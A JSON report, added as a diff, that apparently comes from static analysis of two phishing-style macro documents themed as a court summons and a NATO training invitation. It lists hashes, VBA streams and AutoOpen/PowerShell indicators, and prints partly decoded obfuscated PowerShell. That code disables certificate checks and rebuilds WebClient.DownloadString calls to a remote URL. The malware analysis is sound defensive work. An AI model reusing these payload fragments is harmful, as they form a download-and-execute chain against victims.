@@ -1,0 +1,489 @@
+{
+  "method": "static OOXML/XML/OLE parsing; no Office process; no macro or payload execution",
+  "documents": [
+    {
+      "name": "Court_Summons_Notice_UA_2026",
+      "files": [
+        {
+          "path": "[Content_Types].xml",
+          "bytes": 769,
+          "sha256": "80d09d141523ff94ed7331268a37b1a71d3a13314df4619e1780c5a7e5697656"
+        },
+        {
+          "path": "_rels/.rels",
+          "bytes": 300,
+          "sha256": "0f1a595970d369fa6b683d76ca7fb977bd6cb64e7d8fd890722532683b765125"
+        },
+        {
+          "path": "xl/_rels/workbook.xml.rels",
+          "bytes": 426,
+          "sha256": "635db5ce19fe86b425948e5e83a0288584c6b759d1eb0f025fbd1b29645359d0"
+        },
+        {
+          "path": "xl/styles.xml",
+          "bytes": 639,
+          "sha256": "2438da7019d6e739775025b9b4a0a673dd5e4b1219bd18eed0362acd6490dc6d"
+        },
+        {
+          "path": "xl/vbaProject.bin",
+          "bytes": 14336,
+          "sha256": "c1076828a7fc8c7ff84b044367a7b005d2032ea2488568bdd6a2d0cf4f636f69"
+        },
+        {
+          "path": "xl/workbook.xml",
+          "bytes": 346,
+          "sha256": "c6472c990285056ac0381b349cfd59875a1b48255f2c5d7731cd3647cc3854f3"
+        },
+        {
+          "path": "xl/worksheets/sheet1.xml",
+          "bytes": 161,
+          "sha256": "9b548fedd1e92dace9caad3962e76b25ca3c54c8649fb4a46af1f845c8b68b61"
+        }
+      ],
+      "relationships": [
+        {
+          "path": "_rels/.rels",
+          "bytes": 300,
+          "sha256": "0f1a595970d369fa6b683d76ca7fb977bd6cb64e7d8fd890722532683b765125",
+          "relationships": [
+            {
+              "id": "rId1",
+              "type": "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument",
+              "target": "xl/workbook.xml",
+              "target_mode": "Internal"
+            }
+          ]
+        },
+        {
+          "path": "xl/_rels/workbook.xml.rels",
+          "bytes": 426,
+          "sha256": "635db5ce19fe86b425948e5e83a0288584c6b759d1eb0f025fbd1b29645359d0",
+          "relationships": [
+            {
+              "id": "rId1",
+              "type": "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet",
+              "target": "worksheets/sheet1.xml",
+              "target_mode": "Internal"
+            },
+            {
+              "id": "rId2",
+              "type": "http://schemas.microsoft.com/office/2006/relationships/vbaProject",
+              "target": "vbaProject.bin",
+              "target_mode": "Internal"
+            }
+          ]
+        }
+      ],
+      "external_relationships": [],
+      "embedded_objects": [],
+      "vba_projects": [
+        {
+          "path": "research/examination/stage8-archives/office-parts/Court_Summons_Notice_UA_2026/xl/vbaProject.bin",
+          "bytes": 14336,
+          "sha256": "c1076828a7fc8c7ff84b044367a7b005d2032ea2488568bdd6a2d0cf4f636f69",
+          "streams": [
+            {
+              "name": "PROJECT",
+              "bytes": 192,
+              "sha256": "2d58ef27ff1d643d3ae6a740e0c5c6353a106645872d1f575e83b78927a9c5ce"
+            },
+            {
+              "name": "PROJECTwm",
+              "bytes": 85,
+              "sha256": "3ea8d99fabcdb71f68d427de243154e53fa23d78295617a78337b872ead44a61"
+            },
+            {
+              "name": "VBA/Module1",
+              "bytes": 5100,
+              "sha256": "de7a0564209c545c7d57c7ee7f255193f662323a6cde87e0050fcdfa9d4c0472"
+            },
+            {
+              "name": "VBA/Sheet1",
+              "bytes": 991,
+              "sha256": "9b9efce39615268e26d484776615f83aaab0abda83c7555eff5933da38a32f83"
+            },
+            {
+              "name": "VBA/ThisWorkbook",
+              "bytes": 1188,
+              "sha256": "e0b2e5d328f087bbef66d938b6b64bc56cb0068a59e7fa5bd8a9ae1f67475b43"
+            },
+            {
+              "name": "VBA/_VBA_PROJECT",
+              "bytes": 2570,
+              "sha256": "55b026d06f0d273ae74be65513abb16fbe448883407af17d906d514c76df53fa"
+            },
+            {
+              "name": "VBA/dir",
+              "bytes": 567,
+              "sha256": "5a6714c31cd36f61a67d4c99bf531fa403dca1d5a5f731db172b8023165db010"
+            }
+          ],
+          "modules": [
+            {
+              "stream": "VBA/Module1",
+              "stream_sha256": "de7a0564209c545c7d57c7ee7f255193f662323a6cde87e0050fcdfa9d4c0472",
+              "source": {
+                "source_offset": 799,
+                "source_bytes": 3841,
+                "source_sha256": "b003391c845c14bc55cd1bfead7805c55f99a8f43733c28c3a4cf70573296b42",
+                "recovery": "relaxed-noncanonical",
+                "chunk_headers": [
+                  {
+                    "header": "0x8ffc",
+                    "declared_size": 4095,
+                    "signature": 0,
+                    "compressed": true
+                  },
+                  {
+                    "header": "0x4155",
+                    "declared_size": 344,
+                    "signature": 4,
+                    "compressed": false
+                  }
+                ],
+                "procedures": [
+                  "AutoOpen"
+                ],
+                "indicators": [
+                  "AutoOpen",
+                  "CreateObject",
+                  "EncodedCommand",
+                  "ExecutionPolicy Bypass",
+                  "powershell.exe"
+                ],
+                "encoded_command": {
+                  "base64_characters_recovered": 3334,
+                  "decoded_sha256": "38de924308281ecde28aacb39f1ebf5c1c1d3447be920c727b16144c21de926f",
+                  "decoded_characters": 1250,
+                  "decoded_preview": "New-Alias 'Copy-Heartbeat' ([string]::format(\"{1}{2}{0}\",@(\"x\",\"i\",\"e\")))\r\n\r\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };\r\nif($PSVersionTable.PSVersion.Major -ge 3) { try { $n = [System.Net.SecurityProtocolType]0; foreach($b in [Enum]::GetValues([System.Net.SecurityProtocolType])) { if ([int]$b -le 48) { continue }; $domainname = $n -bor $b; try { [System.Net.ServicePointManager]::SecurityProtocol = $domainname; $n = $domainname } catch {} }; foreach($b in @(192,768,3072,12288)) { $domainname = $n -bor ([System.Net.SecurityProtocolType]$b); try { [System.Net.ServicePointManager]::SecurityProtocol = $domainname; $n = $domainname } catch {} } } catch {} }\r\n$node = [string]::format(\"{2}{4}{3}{1}{0}\",@('ng','Stri','Do','ad','wnlo'));\r\n$files = New-Object (",
+                  "resume_multiline_values": []
+                }
+              }
+            },
+            {
+              "stream": "VBA/Sheet1",
+              "stream_sha256": "9b9efce39615268e26d484776615f83aaab0abda83c7555eff5933da38a32f83",
+              "source": {
+                "source_offset": 819,
+                "source_bytes": 299,
+                "source_sha256": "8e442a8e542ca01c7d87af7e9ad015863e0a19232a647712a6e31b3911beb372",
+                "recovery": "standard",
+                "chunk_headers": [
+                  {
+                    "header": "0xb0a8",
+                    "declared_size": 171,
+                    "signature": 3,
+                    "compressed": true
+                  }
+                ],
+                "procedures": [],
+                "indicators": [],
+                "encoded_command": null
+              }
+            },
+            {
+              "stream": "VBA/ThisWorkbook",
+              "stream_sha256": "e0b2e5d328f087bbef66d938b6b64bc56cb0068a59e7fa5bd8a9ae1f67475b43",
+              "source": {
+                "source_offset": 1008,
+                "source_bytes": 305,
+                "source_sha256": "14de0425a62586687c3d59b7d3d7dc60268f989ab7e07a61403525064d98502a",
+                "recovery": "standard",
+                "chunk_headers": [
+                  {
+                    "header": "0xb0b0",
+                    "declared_size": 179,
+                    "signature": 3,
+                    "compressed": true
+                  }
+                ],
+                "procedures": [],
+                "indicators": [],
+                "encoded_command": null
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Joint_NATO_Training_Program_2026_Invitation",
+      "files": [
+        {
+          "path": "[Content_Types].xml",
+          "bytes": 1453,
+          "sha256": "ff5a5ba3730a8d2ec0cbad39e5edf4ad502107bd0ef8a5347f29262b3dfe8a43"
+        },
+        {
+          "path": "_rels/.rels",
+          "bytes": 590,
+          "sha256": "e19238d7a71fa7a2490776252686f70e2de6238c87cd509b5e3a3cc07c2ea4df"
+        },
+        {
+          "path": "docProps/app.xml",
+          "bytes": 709,
+          "sha256": "3189776231de3ed47a23e59ec8b1acc4e04dab7b6774576fa626fdeb6f13cc39"
+        },
+        {
+          "path": "docProps/core.xml",
+          "bytes": 755,
+          "sha256": "c625d6a209aa37cafd4d49cbc8e2815c56ff93bb7a9ef5ce4b2abf14e8a50e91"
+        },
+        {
+          "path": "word/_rels/document.xml.rels",
+          "bytes": 939,
+          "sha256": "49d2bc305daf1fcca84d6a282e52d1dfd2d79e9ca9f96a3a435d058ae2d8f755"
+        },
+        {
+          "path": "word/_rels/vbaProject.bin.rels",
+          "bytes": 277,
+          "sha256": "c97833e6456aa2bfe9be614f9c3ae41a8ef764b1cc3af92c6a6f273c62309122"
+        },
+        {
+          "path": "word/document.xml",
+          "bytes": 3056,
+          "sha256": "597c904c92ec0ecc6006d0f9639352efd768e92807aa83c4e5d5c503862a7cce"
+        },
+        {
+          "path": "word/fontTable.xml",
+          "bytes": 1749,
+          "sha256": "9e857292db1612f2c79861038bcfded30d3bf0fe73684393785dbfaa273561e7"
+        },
+        {
+          "path": "word/settings.xml",
+          "bytes": 3200,
+          "sha256": "446a18de2627c76d747087ad572c009917e563f23f988b3e758a83597e8d198b"
+        },
+        {
+          "path": "word/styles.xml",
+          "bytes": 42760,
+          "sha256": "36b720ae719c912e2e7dcfd63b665766e0423dc648ba1d14d03f00572c9b0541"
+        },
+        {
+          "path": "word/theme/theme1.xml",
+          "bytes": 8717,
+          "sha256": "e7948e69d1ab51203d82e7e57d491987a16229547a1b6bfd124133a3a895c0ac"
+        },
+        {
+          "path": "word/vbaData.xml",
+          "bytes": 2856,
+          "sha256": "5d38693ab4fbd9aa5284919394f6f89ad07f48ee62a7cb8722b088856144829b"
+        },
+        {
+          "path": "word/vbaProject.bin",
+          "bytes": 16896,
+          "sha256": "c87ceaf027ec6ccffa5b67f8091057d480e137f61a5d3093aaa5fa9fee56398b"
+        },
+        {
+          "path": "word/webSettings.xml",
+          "bytes": 1069,
+          "sha256": "f2f6fe7679634963bf49bae65f941f41934de42ceeb3a806afac4bab92274853"
+        }
+      ],
+      "relationships": [
+        {
+          "path": "_rels/.rels",
+          "bytes": 590,
+          "sha256": "e19238d7a71fa7a2490776252686f70e2de6238c87cd509b5e3a3cc07c2ea4df",
+          "relationships": [
+            {
+              "id": "rId3",
+              "type": "http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties",
+              "target": "docProps/app.xml",
+              "target_mode": "Internal"
+            },
+            {
+              "id": "rId2",
+              "type": "http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties",
+              "target": "docProps/core.xml",
+              "target_mode": "Internal"
+            },
+            {
+              "id": "rId1",
+              "type": "http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument",
+              "target": "word/document.xml",
+              "target_mode": "Internal"
+            }
+          ]
+        },
+        {
+          "path": "word/_rels/document.xml.rels",
+          "bytes": 939,
+          "sha256": "49d2bc305daf1fcca84d6a282e52d1dfd2d79e9ca9f96a3a435d058ae2d8f755",
+          "relationships": [
+            {
+              "id": "rId3",
+              "type": "http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings",
+              "target": "settings.xml",
+              "target_mode": "Internal"
+            },
+            {
+              "id": "rId2",
+              "type": "http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles",
+              "target": "styles.xml",
+              "target_mode": "Internal"
+            },
+            {
+              "id": "rId1",
+              "type": "http://schemas.microsoft.com/office/2006/relationships/vbaProject",
+              "target": "vbaProject.bin",
+              "target_mode": "Internal"
+            },
+            {
+              "id": "rId6",
+              "type": "http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme",
+              "target": "theme/theme1.xml",
+              "target_mode": "Internal"
+            },
+            {
+              "id": "rId5",
+              "type": "http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable",
+              "target": "fontTable.xml",
+              "target_mode": "Internal"
+            },
+            {
+              "id": "rId4",
+              "type": "http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings",
+              "target": "webSettings.xml",
+              "target_mode": "Internal"
+            }
+          ]
+        },
+        {
+          "path": "word/_rels/vbaProject.bin.rels",
+          "bytes": 277,
+          "sha256": "c97833e6456aa2bfe9be614f9c3ae41a8ef764b1cc3af92c6a6f273c62309122",
+          "relationships": [
+            {
+              "id": "rId1",
+              "type": "http://schemas.microsoft.com/office/2006/relationships/wordVbaData",
+              "target": "vbaData.xml",
+              "target_mode": "Internal"
+            }
+          ]
+        }
+      ],
+      "external_relationships": [],
+      "embedded_objects": [],
+      "vba_projects": [
+        {
+          "path": "research/examination/stage8-archives/office-parts/Joint_NATO_Training_Program_2026_Invitation/word/vbaProject.bin",
+          "bytes": 16896,
+          "sha256": "c87ceaf027ec6ccffa5b67f8091057d480e137f61a5d3093aaa5fa9fee56398b",
+          "streams": [
+            {
+              "name": "PROJECT",
+              "bytes": 406,
+              "sha256": "cfe6551b6b30cd80db9d21d6b404a21ef685a55847112c4e53119aafc581d18a"
+            },
+            {
+              "name": "PROJECTwm",
+              "bytes": 65,
+              "sha256": "0271f2e38221aa2a4f90c6a56d864663f20a96960160dd83ad7e8bdbae71d3e0"
+            },
+            {
+              "name": "VBA/Module1",
+              "bytes": 8917,
+              "sha256": "759b0519686c8bfb808bbea835df8734696786e05e558c893f8406ce28a31e3d"
+            },
+            {
+              "name": "VBA/ThisDocument",
+              "bytes": 938,
+              "sha256": "f20e26efcf6da247f1a26ce55fd8fbca3aec807b470edb15c81722de4b6656ce"
+            },
+            {
+              "name": "VBA/_VBA_PROJECT",
+              "bytes": 2583,
+              "sha256": "61b9a171477b5a59b00f66688b6efeaff8df79308ca2b3559e4ee2a370058a34"
+            },
+            {
+              "name": "VBA/dir",
+              "bytes": 563,
+              "sha256": "12044ac187799e2fe3e566cb668fa1db2b001d5ce4600df86eac0cd7699e18a5"
+            }
+          ],
+          "modules": [
+            {
+              "stream": "VBA/Module1",
+              "stream_sha256": "759b0519686c8bfb808bbea835df8734696786e05e558c893f8406ce28a31e3d",
+              "source": {
+                "source_offset": 5987,
+                "source_bytes": 5247,
+                "source_sha256": "5fd8f5cb48d59de8d6af4705fd00d493eee765c0c058422e75e6c7c4dd9e5152",
+                "recovery": "standard",
+                "chunk_headers": [
+                  {
+                    "header": "0xb804",
+                    "declared_size": 2055,
+                    "signature": 3,
+                    "compressed": true
+                  },
+                  {
+                    "header": "0xb367",
+                    "declared_size": 874,
+                    "signature": 3,
+                    "compressed": true
+                  }
+                ],
+                "procedures": [
+                  "AutoOpen"
+                ],
+                "indicators": [
+                  "AutoOpen",
+                  "CreateObject",
+                  "EncodedCommand",
+                  "ExecutionPolicy Bypass",
+                  "powershell.exe"
+                ],
+                "encoded_command": {
+                  "base64_characters_recovered": 4748,
+                  "decoded_sha256": "d6ec34921e5ac00bd80436a4e94a22c87fdabcb3c468895b0be67eebaaa6b96e",
+                  "decoded_characters": 1780,
+                  "decoded_preview": "function Resume-Multiline {\r\n    param(\r\n        [Parameter(Mandatory = $true, Position = 0)]\r\n        [string]$Value,\r\n\r\n        [Parameter(Mandatory = $true, Position = 1)]\r\n        [int]$Seed\r\n    )\r\n\r\n    $size = New-Object System.Random($Seed);\r\n    $userid = New-Object int[] $Value.Length;\r\n    for($scriptblock = 0; $scriptblock -lt $Value.Length; $scriptblock++) {\r\n        $userid[$scriptblock] = $size.Next(0, $Value.Length);\r\n    }\r\n\r\n    $group = $Value.ToCharArray();\r\n    for($scriptblock = $group.Length - 1; $scriptblock -ge 0; $scriptblock--) {\r\n        $httppipelineprepend = $group[$scriptblock];\r\n        $group[$scriptblock] = $group[$userid[$scriptblock]];\r\n        $group[$userid[$scriptblock]] = $httppipelineprepend;\r\n    }\r\n\r\n    return New-Object string(,$group);\r\n}\r\n\r\n[S",
+                  "resume_multiline_values": [
+                    {
+                      "encoded": "ondDriSlngtaow",
+                      "seed": 1575648945,
+                      "decoded": "DownloadString"
+                    },
+                    {
+                      "encoded": "syNeeiben.WetlmtCS.t",
+                      "seed": 27006127,
+                      "decoded": "System.Net.WebClient"
+                    },
+                    {
+                      "encoded": "d:stshor.raa/0tsPt11r1ldoet/stdbtkupe1?69exmto1=/_oiei.uici=srsbN_f8oscpuckcs.b/&npie2",
+                      "seed": 2018835651,
+                      "decoded": "https://192.168.1.101/static/resources?build=PrismexNotebook&kind=ps_script_obfuscated"
+                    }
+                  ]
+                }
+              }
+            },
+            {
+              "stream": "VBA/ThisDocument",
+              "stream_sha256": "f20e26efcf6da247f1a26ce55fd8fbca3aec807b470edb15c81722de4b6656ce",
+              "source": {
+                "source_offset": 781,
+                "source_bytes": 285,
+                "source_sha256": "76f615001478cc8d4cce6fe76f75b2ca62880736645e205dfce15fc20f92e650",
+                "recovery": "standard",
+                "chunk_headers": [
+                  {
+                    "header": "0xb099",
+                    "declared_size": 156,
+                    "signature": 3,
+                    "compressed": true
+                  }
+                ],
+                "procedures": [],
+                "indicators": [],
+                "encoded_command": null
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
